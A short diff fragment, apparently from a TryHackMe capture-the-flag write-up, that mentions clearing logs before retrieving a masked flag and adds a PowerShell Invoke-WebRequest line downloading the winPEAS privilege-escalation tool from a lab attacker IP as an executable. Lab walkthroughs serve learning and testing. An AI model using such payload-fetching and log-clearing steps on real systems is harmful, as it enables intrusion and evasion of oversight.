@@ -39,3 +39,6 @@ After removing all the logs, I successfully retrieved the first flag:
 
 THM{****************}
 
+Invoke-WebRequest -Uri "http://10.6.9.14:8888/winPEASexe" -OutFile "winPEASexe.exe"
+
+
